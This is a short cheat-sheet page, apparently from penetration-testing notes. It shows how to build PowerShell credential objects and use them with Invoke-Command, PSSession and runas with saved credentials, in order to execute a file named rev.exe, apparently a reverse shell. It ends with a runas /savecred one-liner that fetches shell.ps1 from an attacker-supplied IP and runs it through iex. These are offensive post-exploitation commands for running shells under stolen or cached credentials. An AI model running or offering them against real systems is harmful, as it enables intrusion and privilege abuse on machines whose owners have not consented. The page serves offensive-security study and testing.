---
title: "Runas"
date: 2024-7-10
tags: ["powershell", "cred object", "Windows", "runas"]
---

### Create credential object

{{< tab set1 tab1 active >}}Method #1{{< /tab >}}
{{< tab set1 tab2 >}}Method #2{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```console
$cred = New-Object System.Management.Automation.PSCredential($username, $password)
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

<div>

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = '<PASSWORD>'
```

```console
$secstr = New-Object -TypeName System.Security.SecureString
```

```console
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
```

</div>

{{< /tabcontent >}}

### Runas (with cred object)

{{< tab set2 tab1 active >}}Invoke-Command{{< /tab >}}
{{< tab set2 tab2 >}}PSSession{{< /tab >}}
{{< tabcontent set2 tab1 >}}

<div>

```console
Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost
```

```console
# If error, try
Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost -auth credssp
```

```console
# Invoke command with config
Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost -ConfigurationName config_name
```

</div>

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

<div>

```console
new-pssession -computername . -credential $cred
```

```console
# Switch to new session
enter-pssession 1
```

</div>

{{< /tabcontent >}}

### Runas (with cache creds)

#### Check cache creds

<div>

```console
cmdkey /list
```

</div>

#### Run Command

<div>

```console
# e.g. Upload and run a shell
runas /user:<DOMAIN>\<USER> /savecred "powershell iex(new-object net.webclient).downloadstring('http://<LOCAL_IP>/shell.ps1')"
```

</div>

<br>
